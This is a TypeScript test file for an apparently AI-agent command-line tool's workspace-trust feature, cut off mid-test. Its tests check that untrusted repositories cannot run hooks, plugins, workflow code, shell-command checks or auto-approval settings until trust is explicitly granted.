import { afterAll, beforeAll, expect, test } from "bun:test"
import fs from "node:fs/promises"
import os, { EOL } from "node:os"
import path from "node:path"
import type { TrustStatus } from "@orbit/client/promise"
import { SessionID } from "@orbit/schema/session-id"
import { refusal, unanswered } from "../src/util/trust"
import { isolatedEnv } from "./fixture/environment"

// `orb run` and its siblings against a real private server and a scripted model, in repositories that hold something
// back. Every `orb` here runs without ORBIT_TRUST_PROJECT, which is how the shared background service behaves, so a
// folder is trusted only when a grant says so. The private servers share one database, so a grant that is stored
// outlives the process that made it, and each test uses a repository of its own.
const model = "ollama/trust:1b"
let runs = 0
// What the model was told the last time a tool answered it.
const toolAnswers: string[] = []
const details = {
  format: "gguf",
  family: "llama",
  families: ["llama"],
  parameter_size: "1B",
  quantization_level: "Q4",
}
const ollama = Bun.serve({
  hostname: "127.0.0.1",
  port: 0,
  async fetch(request) {
    const pathname = new URL(request.url).pathname
    if (pathname === "/api/tags")
      return Response.json({
        models: [
          { name: "trust:1b", model: "trust:1b", modified_at: "2026-01-01T00:00:00Z", size: 1, digest: "d", details },
        ],
      })
    if (pathname === "/api/show")
      return Response.json({
        parameters: "",
        capabilities: ["completion", "tools"],
        model_info: { "general.architecture": "llama", "llama.context_length": 32_768 },
        details: { parent_model: "", ...details },
      })
    if (pathname === "/api/ps") return Response.json({ models: [] })
    const body: { tools?: unknown; messages: Array<{ role: string; content?: unknown }> } = await request.json()
    if (body.tools) runs++
    const last = body.messages.at(-1)
    if (last?.role === "tool") toolAnswers.push(JSON.stringify(last.content))
    // Asked to write a file, the model calls the write tool once; every other request gets a plain reply.
    const writes = body.tools && last?.role === "user" && JSON.stringify(last.content).includes("write blocked.txt")
    // The lead of a team ends it on its first turn, with the tag a lead finishes with.
    const finishes = body.tools && last?.role === "user" && JSON.stringify(last.content).includes("You lead.")
    const events = [
      {
        choices: [
          {
            index: 0,
            delta: writes
              ? {
                  role: "assistant",
                  tool_calls: [
                    {
                      index: 0,
                      id: "call_write",
                      type: "function",
                      function: { name: "write", arguments: JSON.stringify({ path: "blocked.txt", content: "no\n" }) },
                    },
                  ],
                }
              : {
                  role: "assistant",
                  content: body.tools ? (finishes ? "<done>finished</done>" : "ran fine") : "Trust",
                },
          },
        ],
      },
      { choices: [{ index: 0, delta: {}, finish_reason: writes ? "tool_calls" : "stop" }] },
      { choices: [], usage: { prompt_tokens: 10, completion_tokens: 2, total_tokens: 12 } },
    ]
    return new Response(`${events.map((event) => `data: ${JSON.stringify(event)}\n\n`).join("")}data: [DONE]\n\n`, {
      headers: { "content-type": "text/event-stream" },
    })
  },
})
// Real, because the server names a folder by its real path and a test compares what it prints with the folders it made.
const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "orbit-trust-")))
const workflow = path.join(root, "noop.ts")
const suite = path.join(root, "suite.ts")
const mark = path.join(root, "mark.js")

beforeAll(async () => {
  // The script of every command that a test file defines: it leaves <name>.marker beside itself, so the marker lands in
  // one place whichever folder the platform shell runs the command in.
  await Bun.write(mark, 'await Bun.write(`${import.meta.dir}/${process.argv[2]}.marker`, "ran")\n')
  await Bun.write(
    path.join(root, "config", "orbit.json"),
    JSON.stringify({ providers: { ollama: { settings: { baseURL: `http://127.0.0.1:${ollama.port}/v1` } } } }),
  )
  await Bun.write(workflow, `export default { name: "noop", run: () => "done" }\n`)
  await Bun.write(
    suite,
    `export default { name: "trust", models: ["${model}"], tasks: [{ id: "task", prompt: "say ok", checks: [] }] }\n`,
  )
})

afterAll(async () => {
  await ollama.stop(true)
  await fs.rm(root, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 })
})

// The settings of a project that guards its files: a hook blocks every write.
const guard = { hooks: { PreToolUse: [{ matcher: "write", hooks: [{ type: "command", command: "exit 2" }] }] } }

// A repository with a hook in its settings and a plugin in its `.orbit` directory: what a clone can bring that runs
// code on its own.
async function hooked(name: string) {
  const directory = path.join(root, "work", name)
  await Bun.write(path.join(directory, "orbit.json"), JSON.stringify(guard))
  await Bun.write(
    path.join(directory, ".orbit", "plugins", "greeter.ts"),
    `export default { id: "greeter", async setup() {} }`,
  )
  return directory
}

// A folder whose config holds nothing back.
async function quiet(name: string) {
  const directory = path.join(root, "work", name)
  await Bun.write(path.join(directory, "orbit.json"), JSON.stringify({ model }))
  return directory
}

// A folder with no config at all, which is what a fresh clone that brings only a workflow or a suite looks like: it holds
// nothing back, so the check on what is held back lets a command through.
async function bare(name: string) {
  const directory = path.join(root, "work", name)
  await fs.mkdir(directory, { recursive: true })
  return directory
}

// A module whose top-level code leaves a marker when it is imported, as the code of any workflow or suite can.
async function traced(directory: string, name: string, body: string) {
  const file = path.join(directory, name)
  const marker = path.join(directory, `${name}.marker`)
  await Bun.write(
    file,
    `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(marker)}, "imported")\n${body}\n`,
  )
  return { file, marker }
}

const noop = `export default { name: "traced", run: () => "done" }`
const oneTask = `export default { name: "traced", models: ["${model}"], tasks: [{ id: "task", prompt: "say ok", checks: [] }] }`

// A shell command that leaves a marker when the platform shell runs it, the same under sh and cmd, as the command of
// any workflow or suite can. It is written as a quoted YAML scalar, which a JSON string also is.
function marked(name: string) {
  const command = `${process.execPath} ${mark} ${name}`
  return { command, quoted: JSON.stringify(command), marker: path.join(root, `${name}.marker`) }
}

// A git repository in a folder that has config of its own, as a folder of several repositories can. The folder is
// trusted on its own, so trusting the repository does not lift what the folder holds back.
async function layered(name: string) {
  const parent = path.join(root, "work", name)
  const child = path.join(parent, "child")
  await Bun.write(path.join(parent, "orbit.json"), JSON.stringify(guard))
  await fs.mkdir(child, { recursive: true })
  expect(Bun.spawnSync(["git", "init", "--quiet", child]).exitCode).toBe(0)
  return { parent, child }
}

async function orb(directory: string, args: string[]) {
  const child = Bun.spawn([process.execPath, "run", "src/index.ts", ...args], {
    cwd: path.join(import.meta.dir, ".."),
    env: isolatedEnv(root, {
      USERPROFILE: root,
      PWD: directory,
      ORBIT_TRUST_PROJECT: undefined,
      ORBIT_CONFIG: undefined,
      ORBIT_CONFIG_CONTENT: undefined,
      OLLAMA_CONTEXT_LENGTH: undefined,
    }),
    stdin: "ignore",
    stdout: "pipe",
    stderr: "pipe",
  })
  const [code, stdout, stderr] = await Promise.all([
    child.exited,
    new Response(child.stdout).text(),
    new Response(child.stderr).text(),
  ])
  return { code, stdout, stderr }
}

const succeeded = (result: { code: number; stderr: string }) =>
  expect({ code: result.code, stderr: result.code === 0 ? "" : result.stderr }).toEqual({ code: 0, stderr: "" })

test("orb run stops with guidance in an untrusted repository that holds back its hooks and plugins", async () => {
  const repository = await hooked("refused")
  const before = runs

  const result = await orb(repository, ["run", "--standalone", "--model", model, "say ok"])

  expect(result.code).toBe(1)
  expect(result.stdout).toBe("")
  expect(result.stderr).toContain("is not trusted")
  expect(result.stderr).toMatch(/orbit\.json\s+hooks/)
  expect(result.stderr).toMatch(/\.orbit\s+plugins/)
  expect(result.stderr).toContain("`orb trust`")
  expect(result.stderr).toContain("--trust")
  // It stopped before any work: the model heard nothing.
  expect(runs).toBe(before)
}, 120_000)

test("orb run reports the refusal in the format it was asked for, as it does any error before a session exists", async () => {
  const repository = await hooked("refused-json")
  const before = runs

  const lines = await orb(repository, ["run", "--standalone", "--format", "stream-json", "--model", model, "say ok"])
  const result = await orb(repository, ["run", "--standalone", "--format", "result", "--model", model, "say ok"])

  expect(lines.code).toBe(1)
  expect(JSON.parse(lines.stdout)).toMatchObject({
    type: "error",
    sessionID: "",
    error: { type: "unknown", message: expect.stringContaining("is not trusted") },
  })
  expect(result.code).toBe(1)
  expect(JSON.parse(result.stdout)).toMatchObject({
    type: "result",
    sessionID: "",
    is_error: true,
    error: expect.stringContaining("is not trusted"),
  })
  expect(runs).toBe(before)
}, 120_000)

test("orb run --trust runs once, and the next plain run stops again", async () => {
  const repository = await hooked("one-run")

  // Without --standalone: --trust alone has to choose a private server, or the grant would reach the background service.
  const trusted = await orb(repository, ["run", "--trust", "--model", model, "say ok"])

  succeeded(trusted)
  expect(trusted.stdout).toContain("ran fine")
  await fs.mkdir(path.join(root, "state"), { recursive: true })
  expect(await Array.fromAsync(new Bun.Glob("**/service*.json").scan(path.join(root, "state")))).toEqual([])
  // The grant lived in that run's private server, so nothing about it was stored.
  const listed = await orb(repository, ["trust", "--standalone", "--list"])
  succeeded(listed)
  expect(listed.stdout).not.toContain(repository)
  const again = await orb(repository, ["run", "--standalone", "--model", model, "say ok"])
  expect(again.code).toBe(1)
  expect(again.stderr).toContain("is not trusted")
}, 180_000)

test("the hook of a repository trusted for a run is in force from the first step, as it is once trusted for good", async () => {
  const repository = await hooked("in-force")
  const blocked = path.join(repository, "blocked.txt")
  const answered = toolAnswers.length

  succeeded(await orb(repository, ["run", "--trust", "--standalone", "--model", model, "write blocked.txt"]))

  // The model asked for a write, and the project's own hook refused it before anything was written.
  expect(toolAnswers.slice(answered).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)

  succeeded(await orb(repository, ["trust", "--standalone"]))
  const stored = toolAnswers.length
  succeeded(await orb(repository, ["run", "--standalone", "--model", model, "write blocked.txt"]))

  expect(toolAnswers.slice(stored).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)
}, 240_000)

test("after orb trust a plain orb run proceeds, and orb trust --revoke takes the grant back", async () => {
  const repository = await hooked("granted")

  const granted = await orb(repository, ["trust", "--standalone"])

  succeeded(granted)
  expect(granted.stdout).toContain("Trusted")
  expect(granted.stdout).toMatch(/orbit\.json\s+hooks/)
  const listed = await orb(repository, ["trust", "--standalone", "--list"])
  succeeded(listed)
  expect(listed.stdout).toContain(repository)
  const repeated = await orb(repository, ["trust", "--standalone"])
  succeeded(repeated)
  expect(repeated.stdout).toContain("is already trusted")

  const ran = await orb(repository, ["run", "--standalone", "--model", model, "say ok"])
  succeeded(ran)
  expect(ran.stdout).toContain("ran fine")

  const revoked = await orb(repository, ["trust", "--standalone", "--revoke"])
  succeeded(revoked)
  expect(revoked.stdout).toContain("is not trusted")
  const refused = await orb(repository, ["run", "--standalone", "--model", model, "say ok"])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain("is not trusted")
}, 240_000)

test("orb trust refuses the home directory, which is never trusted for good", async () => {
  const repository = await hooked("elsewhere")

  // The test home is the root of the isolated environment, named in full and as a shell that does not expand ~ passes it.
  for (const home of [root, "~"]) {
    const result = await orb(repository, ["trust", "--standalone", home])

    expect(result.code).toBe(1)
    expect(result.stdout).toBe("")
    expect(result.stderr).toContain("home directory or a filesystem root")
    expect(result.stderr).toContain("--trust")
    expect(result.stderr).toContain("terminal UI")
  }
  // Nothing was stored for it.
  const listed = await orb(repository, ["trust", "--standalone", "--list"])
  succeeded(listed)
  expect(listed.stdout.split(/\r?\n/).map((line) => line.split("  ")[0])).not.toContain(root)
}, 120_000)

test("orb trust names a folder that is not there instead of passing a server error on", async () => {
  const repository = await hooked("typo")

  const result = await orb(repository, ["trust", "--standalone", "porject"])

  expect(result.code).toBe(1)
  expect(result.stdout).toBe("")
  expect(result.stderr).toContain(`Not a folder: ${path.join(repository, "porject")}`)
}, 120_000)

test("a repository with nothing withheld runs without being trusted, as does --bare, and --trust works in the home directory", async () => {
  const clean = path.join(root, "work", "clean")
  await Bun.write(path.join(clean, "orbit.json"), JSON.stringify({ model }))

  succeeded(await orb(clean, ["run", "--standalone", "--model", model, "say ok"]))
  // --bare leaves the project config unread, so a repository that holds back plenty has nothing left to hold back.
  succeeded(await orb(await hooked("bare"), ["run", "--bare", "--model", model, "say ok"]))
  // Home holds nothing a grant would let through, so what this shows is that the explicit grant for it is accepted.
  succeeded(await orb(root, ["run", "--trust", "--standalone", "--model", model, "say ok"]))
}, 180_000)

test("a server older than workspace trust cannot say that a folder is trusted: orb run goes on and says so, orb trust says why it cannot help, and a flow or eval that would run the folder's files stops", async () => {
  const requests: string[] = []
  const old = Bun.serve({
    port: 0,
    fetch(request) {
      const pathname = new URL(request.url).pathname
      requests.push(pathname)
      if (pathname === "/api/info") return Response.json({ version: "0.0.0-old", pid: process.pid, urls: [] })
      // It has no trust routes, which is what an older server answers a path it does not have with.
      return new Response(undefined, { status: 404 })
    },
  })
  try {
    const repository = await hooked("older")

    const run = await orb(repository, ["run", "--server", old.url.toString(), "say ok"])
    const trust = await orb(repository, ["trust", "--server", old.url.toString()])

    // The run asked about trust, was told there is no such thing, and went on to look for its session.
    expect(requests.slice(0, 3)).toEqual(["/api/info", "/api/location/trust", "/api/location"])
    expect(run.stderr).not.toContain("not trusted")
    // Such a server applies every project's config, so the run says that nothing was checked, on stderr where a script
    // reading JSON on stdout does not see it.
    expect(run.stderr).toContain("older than workspace trust")
    expect(run.stderr).toContain("orb service restart")
    expect(trust.code).toBe(1)
    expect(trust.stderr).toContain("older than workspace trust")

    // A command that would run what the folder brings, in this process, cannot go on with nothing checked: that server
    // applies the config without asking, but it cannot say that the folder is trusted either, and the code or the commands
    // would run here. A fresh clone that holds nothing back is the case that matters, since nothing else would stop it.
    const clone = await bare("older-files")
    const flowModule = await traced(clone, "workflow.ts", noop)
    const suiteModule = await traced(clone, "suite.ts", oneTask)
    const check = marked("older-check")
    const checkFile = path.join(clone, "check.yaml")
    const autoFile = path.join(clone, "auto.yaml")
    const suiteFile = path.join(clone, "suite.json")
    await Bun.write(checkFile, `name: older\nnodes:\n  - id: tests\n    type: check\n    command: ${check.quoted}\n`)
    await Bun.write(
      autoFile,
      `name: older\nnodes:\n  - id: work\n    prompt: say ok\n    model: ${model}\n    permissions: auto\n`,
    )
    await Bun.write(
      suiteFile,
      JSON.stringify({
        name: "older",
        models: [model],
        tasks: [{ id: "task", prompt: "say ok", checks: [check.command] }],
      }),
    )
    const server = old.url.toString()
    const before = runs
    const asked = requests.length

    const stopped = [
      [await orb(clone, ["flow", "run", "--server", server, flowModule.file]), "runs code from the folder"],
      [await orb(clone, ["flow", "run", "--server", server, checkFile]), "runs shell commands from the folder"],
      [await orb(clone, ["flow", "run", "--server", server, autoFile]), "approves actions without asking you"],
      [await orb(clone, ["eval", suiteModule.file, "--server", server]), "runs code from the folder"],
      [await orb(clone, ["eval", suiteFile, "--server", server]), "runs shell commands from the folder"],
    ] as const

    for (const [result, says] of stopped) {
      expect(result.code).toBe(1)
      expect(result.stdout).toBe("")
      // It says that the server cannot tell, what the command would run, and every way to get an answer.
      expect(result.stderr).toContain(
        `the server is older than workspace trust, so it cannot say whether ${clone} is trusted`,
      )
      expect(result.stderr).toContain(says)
      expect(result.stderr).toContain("`orb service restart`")
      expect(result.stderr).toContain("--standalone")
      expect(result.stderr).toContain("--trust")
      // It is not the refusal for a folder that is known not to be trusted.
      expect(result.stderr).not.toContain("is not trusted")
    }
    // Nothing of the folder's ran: no module was imported, no command started, and no model was asked.
    for (const marker of [flowModule.marker, suiteModule.marker, check.marker])
      expect(await Bun.file(marker).exists()).toBe(false)
    expect(runs).toBe(before)
    // Each command asked about trust, and went no further.
    expect(requests.slice(asked)).toEqual(
      Array.from({ length: stopped.length }, () => ["/api/info", "/api/location/trust"]).flat(),
    )
  } finally {
    await old.stop(true)
  }
}, 240_000)

test("--trust cannot be combined with --server", async () => {
  const repository = await hooked("server")

  for (const command of [
    ["run", "say ok"],
    ["loop", "10s", "check", "--times", "1"],
    ["eval", suite],
    ["flow", "run", workflow],
  ]) {
    const result = await orb(repository, [...command, "--trust", "--server", "http://127.0.0.1:9"])

    expect(result.code).toBe(1)
    expect(result.stderr).toContain("--trust and --server cannot be combined")
  }
}, 120_000)

test("orb loop, orb eval and orb flow stop in an untrusted repository before doing any work", async () => {
  const repository = await hooked("siblings")
  const before = runs

  const looped = await orb(repository, ["loop", "10s", "check", "--times", "1", "--standalone", "--model", model])
  const evaluated = await orb(repository, ["eval", suite, "--standalone"])
  const flowed = await orb(repository, ["flow", "run", "--standalone", workflow])

  for (const result of [looped, evaluated, flowed]) {
    expect(result.code).toBe(1)
    expect(result.stderr).toContain("is not trusted")
  }
  // The loop never started its first run.
  expect(looped.stderr).not.toContain("Loop run")
  expect(runs).toBe(before)
}, 180_000)

test("orb flow run --trust and orb flow resume --trust grant for their own run only", async () => {
  const repository = await hooked("flows")

  const started = await orb(repository, ["flow", "run", "--trust", "--standalone", workflow])
  succeeded(started)
  expect(started.stdout).toContain("done")
  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id

  const refused = await orb(repository, ["flow", "resume", "--standalone", id])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain("is not trusted")
  succeeded(await orb(repository, ["flow", "resume", "--trust", "--standalone", id]))
}, 240_000)

test("a workflow or suite file is not loaded, so none of its code runs, before the trust check", async () => {
  const repository = await hooked("load-order")
  const marker = path.join(root, "work", "load-order.marker")
  // The top-level code of a file leaves a trace when the file is imported, as the code of any workflow or suite does.
  const traced = (body: string) =>
    `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(marker)}, "loaded")\n${body}\n`
  const flowFile = path.join(root, "work", "load-order-flow.ts")
  const suiteFile = path.join(root, "work", "load-order-suite.ts")
  await Bun.write(flowFile, traced(`export default { name: "traced", run: () => "done" }`))
  await Bun.write(
    suiteFile,
    traced(
      `export default { name: "traced", models: ["${model}"], tasks: [{ id: "task", prompt: "say ok", checks: [] }] }`,
    ),
  )

  const started = await orb(repository, ["flow", "run", "--standalone", flowFile])
  const evaluated = await orb(repository, ["eval", suiteFile, "--standalone"])

  for (const result of [started, evaluated]) {
    expect(result.code).toBe(1)
    expect(result.stderr).toContain("is not trusted")
  }
  expect(await Bun.file(marker).exists()).toBe(false)

  // A resumed run names its workflow file in the repository's own run store, so that file is the one it must not import.
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", flowFile]))
  expect(await Bun.file(marker).exists()).toBe(true)
  await fs.rm(marker)
  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id
  const resumed = await orb(repository, ["flow", "resume", "--standalone", id])
  expect(resumed.code).toBe(1)
  expect(resumed.stderr).toContain("is not trusted")
  expect(await Bun.file(marker).exists()).toBe(false)
}, 360_000)

test("a workflow or suite module is not imported in an untrusted folder that holds nothing back, and runs with --trust", async () => {
  const repository = await bare("modules")
  const flowModule = await traced(repository, "workflow.ts", noop)
  const suiteModule = await traced(repository, "suite.ts", oneTask)
  const before = runs

  const started = await orb(repository, ["flow", "run", "--standalone", flowModule.file])
  const evaluated = await orb(repository, ["eval", suiteModule.file, "--standalone"])

  for (const [result, module] of [
    [started, flowModule],
    [evaluated, suiteModule],
  ] as const) {
    expect(result.code).toBe(1)
    expect(result.stdout).toBe("")
    expect(result.stderr).toContain(`${repository} is not trusted`)
    // It says the command runs code from the folder, names the file, and gives both ways to trust the folder.
    expect(result.stderr).toContain("runs code from the folder")
    expect(result.stderr).toContain(path.basename(module.file))
    expect(result.stderr).toContain("`orb trust`")
    expect(result.stderr).toContain("--trust")
    // Nothing is held back, so there is no list of files to name.
    expect(result.stderr).not.toContain("holds back")
    // The code in the file never ran.
    expect(await Bun.file(module.marker).exists()).toBe(false)
  }
  expect(runs).toBe(before)

  // --trust is the explicit grant for one run: the modules are imported and run.
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", flowModule.file]))
  expect(await Bun.file(flowModule.marker).exists()).toBe(true)
  succeeded(await orb(repository, ["eval", suiteModule.file, "--trust", "--standalone"]))
  expect(await Bun.file(suiteModule.marker).exists()).toBe(true)
  expect(runs).toBeGreaterThan(before)
}, 360_000)

test("a recorded run's workflow module is not imported by resume or replay in an untrusted folder that holds nothing back", async () => {
  const repository = await bare("recorded")
  const module = await traced(repository, "workflow.ts", noop)
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", module.file]))
  // The run store, which sits in the repository, names the module a resume or a replay loads.
  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id
  await fs.rm(module.marker)

  const resumed = await orb(repository, ["flow", "resume", "--standalone", id])
  const replayed = await orb(repository, ["flow", "replay", "--standalone", id])

  for (const result of [resumed, replayed]) {
    expect(result.code).toBe(1)
    expect(result.stderr).toContain(`${repository} is not trusted`)
    expect(result.stderr).toContain("runs code from the folder")
    expect(result.stderr).toContain("`orb trust`")
    expect(result.stderr).toContain("--trust")
  }
  expect(await Bun.file(module.marker).exists()).toBe(false)

  succeeded(await orb(repository, ["flow", "resume", "--trust", "--standalone", id]))
  expect(await Bun.file(module.marker).exists()).toBe(true)
  await fs.rm(module.marker)
  const trusted = await orb(repository, ["flow", "replay", "--trust", "--standalone", id])
  succeeded(trusted)
  expect(trusted.stderr).toContain(`replay matches the recorded output of ${id}`)
  expect(await Bun.file(module.marker).exists()).toBe(true)
}, 360_000)

test("a YAML workflow is held to what the folder holds back, as orb run is, and replaying one connects to no server", async () => {
  const repository = await bare("yaml")
  const file = path.join(repository, "workflow.yaml")
  await Bun.write(file, "name: pause\nnodes:\n  - id: approve\n    type: gate\n    message: Go on?\n")

  // Loading it runs no code and the folder holds nothing back, so the run goes ahead and stops at its gate, which
  // needs no model.
  const started = await orb(repository, ["flow", "run", "--standalone", file])

  expect(started.code).toBe(2)
  expect(started.stderr).toContain("approve: Go on?")
  expect(started.stderr).not.toContain("is not trusted")
  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id
  succeeded(await orb(repository, ["flow", "approve", id, "approve"]))
  succeeded(await orb(repository, ["flow", "resume", "--standalone", id]))
  // Nothing listens at that address, so a replay that asked a server whether the folder is trusted would fail on it.
  const replayed = await orb(repository, ["flow", "replay", id, "--server", "http://127.0.0.1:9"])
  succeeded(replayed)
  expect(replayed.stderr).toContain(`replay matches the recorded output of ${id}`)
}, 360_000)

test("a workflow or suite that defines shell commands is not run in an untrusted folder that holds nothing back, and runs with --trust", async () => {
  const repository = await bare("commands")
  const check = marked("check-node")
  const verify = marked("verify-checks")
  const task = marked("task-checks")
  const flowFile = path.join(repository, "workflow.yaml")
  const verifyFile = path.join(repository, "verify.yaml")
  const suiteFile = path.join(repository, "suite.json")
  await Bun.write(flowFile, `name: commands\nnodes:\n  - id: tests\n    type: check\n    command: ${check.quoted}\n`)
  await Bun.write(
    verifyFile,
    `name: verifies\nnodes:\n  - id: work\n    type: verify\n    prompt: say ok\n    model: ${model}\n    checks:\n      - ${verify.quoted}\n`,
  )
  await Bun.write(
    suiteFile,
    JSON.stringify({
      name: "commands",
      models: [model],
      tasks: [{ id: "task", prompt: "say ok", checks: [task.command] }],
    }),
  )
  const before = runs

  // Reading these files runs nothing, and the folder holds nothing back, but a run of each executes a shell command:
  // a check node, the checks of a verify node, and the checks of a suite task.
  const attempts = [
    [await orb(repository, ["flow", "run", "--standalone", flowFile]), flowFile, "tests", check],
    [await orb(repository, ["flow", "run", "--standalone", verifyFile]), verifyFile, "work", verify],
    [await orb(repository, ["eval", suiteFile, "--standalone"]), suiteFile, "task", task],
  ] as const

  for (const [result, file, id, command] of attempts) {
    expect(result.code).toBe(1)
    expect(result.stdout).toBe("")
    expect(result.stderr).toContain(`${repository} is not trusted`)
    // It says the command runs shell commands from the folder, names the file and lists what it found by node or task,
    // and gives both ways to trust the folder.
    expect(result.stderr).toContain("runs shell commands from the folder")
    expect(result.stderr).toContain(`${path.basename(file)} defines them`)
    expect(result.stderr).toContain(`  ${id}  ${command.command}`)
    expect(result.stderr).toContain("`orb trust`")
    expect(result.stderr).toContain("--trust")
    // Nothing is held back, so there is no list of files to name.
    expect(result.stderr).not.toContain("holds back")
    // The command never ran.
    expect(await Bun.file(command.marker).exists()).toBe(false)
  }
  // No agent did any work either.
  expect(runs).toBe(before)

  // --trust is the explicit grant for one run: the commands of each file run.
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", flowFile]))
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", verifyFile]))
  succeeded(await orb(repository, ["eval", suiteFile, "--trust", "--standalone"]))
  for (const command of [check, verify, task]) expect(await Bun.file(command.marker).exists()).toBe(true)
  expect(runs).toBeGreaterThan(before)

  // A resumed eval loads the same suite, so it is held to the same trust.
  const recorded: Array<{ id: string; workflow: string }> = JSON.parse(
    (await orb(repository, ["flow", "ls", "--format", "json"])).stdout,
  )
  const evalRun = recorded.find((run) => run.workflow.startsWith("eval:"))?.id
  expect(evalRun).toBeString()
  await fs.rm(task.marker)
  const resumed = await orb(repository, ["eval", suiteFile, "--resume", String(evalRun), "--standalone"])
  expect(resumed.code).toBe(1)
  expect(resumed.stderr).toContain("runs shell commands from the folder")
  expect(await Bun.file(task.marker).exists()).toBe(false)
}, 360_000)

test("a recorded YAML run's commands are not run again by resume in an untrusted folder, and a replay is not held up by them", async () => {
  const repository = await bare("recorded-commands")
  const check = marked("recorded-check")
  const file = path.join(repository, "workflow.yaml")
  await Bun.write(file, `name: recorded\nnodes:\n  - id: tests\n    type: check\n    command: ${check.quoted}\n`)
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", file]))
  expect(await Bun.file(check.marker).exists()).toBe(true)
  await fs.rm(check.marker)
  // The run store, which sits in the repository, names the file that a resume loads.
  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id

  const resumed = await orb(repository, ["flow", "resume", "--standalone", id])

  expect(resumed.code).toBe(1)
  expect(resumed.stderr).toContain(`${repository} is not trusted`)
  expect(resumed.stderr).toContain(`  tests  ${check.command}`)
  expect(await Bun.file(check.marker).exists()).toBe(false)
  // A replay answers every check from the recording, so it runs none: it needs no trust, and it connects to no server,
  // which nothing listens at that address would show.
  const replayed = await orb(repository, ["flow", "replay", id, "--server", "http://127.0.0.1:9"])
  succeeded(replayed)
  expect(replayed.stderr).toContain(`replay matches the recorded output of ${id}`)
  expect(await Bun.file(check.marker).exists()).toBe(false)

  succeeded(await orb(repository, ["flow", "resume", "--trust", "--standalone", id]))
  expect(await Bun.file(check.marker).exists()).toBe(true)
}, 360_000)

test("a YAML workflow that sets permissions to auto is not run in an untrusted folder that holds nothing back, and runs with --trust", async () => {
  const repository = await bare("approvals")
  const files = [
    [
      "agent.yaml",
      `name: agent\nnodes:\n  - id: work\n    prompt: say ok\n    model: ${model}\n    permissions: auto\n`,
      "work",
      "auto",
    ],
    [
      "verify.yaml",
      `name: verifies\nnodes:\n  - id: work\n    type: verify\n    prompt: say ok\n    model: ${model}\n    permissions: auto\n    checks: []\n`,
      "work",
      "auto",
    ],
    [
      "team.yaml",
      `name: crew\nnodes:\n  - id: crew\n    type: team\n    goal: say ok\n    members:\n      lead: { role: lead, model: ${model}, permissions: auto }\n`,
      "crew/lead",
      "auto",
    ],
    // A template is filled in when the node starts, and the reply of an earlier agent can say auto.
    [
      "template.yaml",
      `name: templated\nnodes:\n  - id: plan\n    prompt: say ok\n    model: ${model}\n  - id: work\n    needs: [plan]\n    prompt: say ok\n    model: ${model}\n    permissions: "{{plan.text}}"\n`,
      "work",
      "{{plan.text}}",
    ],
  ] as const
  for (const [name, text] of files) await Bun.write(path.join(repository, name), text)
  const before = runs

  // Reading these files runs nothing, and the folder holds nothing back, but a run of each lets an agent's every request
  // for permission through, whatever the user's own rules say: a file that is not trusted could turn that on for itself.
  for (const [name, , id, value] of files) {
    const result = await orb(repository, ["flow", "run", "--standalone", path.join(repository, name)])

    expect(result.code).toBe(1)
    expect(result.stdout).toBe("")
    expect(result.stderr).toContain(`${repository} is not trusted`)
    // It says the command approves actions, names the file, lists the node with what it sets, and gives both ways to
    // trust the folder.
    expect(result.stderr).toContain("approves actions without asking you")
    expect(result.stderr).toContain(`${name} sets \`permissions\``)
    expect(result.stderr).toContain(`  ${id}  permissions: ${value}`)
    expect(result.stderr).toContain("`orb trust`")
    expect(result.stderr).toContain("--trust")
    // Nothing is held back, and the file defines no command, so neither is listed.
    expect(result.stderr).not.toContain("holds back")
    expect(result.stderr).not.toContain("shell commands")
  }
  // No agent did any work.
  expect(runs).toBe(before)

  // --trust is the explicit grant for one run: each file runs.
  for (const [name] of files)
    succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", path.join(repository, name)]))
  expect(runs).toBeGreaterThan(before)

  // A workflow whose nodes reject, or set nothing, still runs without a grant, and so does one the user passes --auto to:
  // that flag is the user's own, and nothing the folder brings.
  const rejecting = path.join(repository, "rejecting.yaml")
  await Bun.write(
    rejecting,
    `name: rejecting\nnodes:\n  - id: work\n    prompt: say ok\n    model: ${model}\n    permissions: reject\n  - id: other\n    prompt: say ok\n    model: ${model}\n`,
  )
  succeeded(await orb(repository, ["flow", "run", "--standalone", rejecting]))
  succeeded(await orb(repository, ["flow", "run", "--auto", "--standalone", rejecting]))
}, 480_000)

test("a recorded run whose agents were set to approve is not run again by resume in an untrusted folder, and a replay is not held up", async () => {
  const repository = await bare("recorded-approvals")
  const file = path.join(repository, "workflow.yaml")
  await Bun.write(
    file,
    `name: recorded\nnodes:\n  - id: work\n    prompt: say ok\n    model: ${model}\n    permissions: auto\n`,
  )
  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", file]))
  // The run store, which sits in the repository, names the file that a resume loads.
  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id
  const before = runs

  const resumed = await orb(repository, ["flow", "resume", "--standalone", id])

  expect(resumed.code).toBe(1)
  expect(resumed.stderr).toContain(`${repository} is not trusted`)
  expect(resumed.stderr).toContain("  work  permissions: auto")
  // A replay answers every node from the recording and asks no model, so nothing of it is ever approved: it needs no trust,
  // and it connects to no server, which nothing listens at that address would show. (It exits with 1 all the same, because
  // an agent's replayed result is marked as reused and so differs from what was recorded.)
